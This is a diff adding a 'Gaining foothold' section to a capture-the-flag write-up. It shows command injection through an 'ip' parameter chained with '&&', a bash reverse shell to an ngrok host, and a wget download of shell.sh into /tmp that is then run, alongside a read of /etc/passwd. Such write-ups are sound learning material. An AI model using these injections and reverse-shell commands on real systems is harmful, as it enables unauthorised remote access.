@@ -25,9 +25,25 @@ There is some sanitization to avoid RCE, but by using `&&` , we can still execut
 ip=file:///etc/passwd&&id&&
 ```
 
+#### Gaining foothold
 
+I used ngrok to gain a foothold on the punisher user, and for the rest of the lateral movement, I used the CTF server itself. 
+I used ngrok to expose my local port to the internet so that I could upload a shell code file onto the server
 
+```sh
+cat shell.sh
+bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16004 0>&1'
+```
 
+Uploaded this file on server using wget at /tmp/shell.sh
+```sh
+# File uploaded on the server 
+ip=file:///etc/passwd&&wget http://0.tcp.in.ngrok.io:16004/
+shell.sh -O /tmp/shell.sh&&
+
+# Executed the /tmp/shell.sh file 
+ip=file:///etc/passwd&&bash /tmp/shell.sh&&
+```
 
 
 ### References
